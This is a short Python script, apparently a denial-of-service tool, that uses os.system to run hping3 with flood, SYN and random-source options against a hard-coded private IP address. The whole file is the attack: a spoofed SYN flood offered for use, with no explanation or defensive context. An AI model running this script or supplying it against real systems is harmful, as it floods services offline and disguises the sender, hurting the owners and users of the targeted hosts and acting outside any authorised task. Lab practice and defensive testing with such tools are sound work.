import os

target_ip = "192.168.10.128"
os.system("hping3 -c 10000 -d 120 -S -w 64  --flood --rand-source "+target_ip)
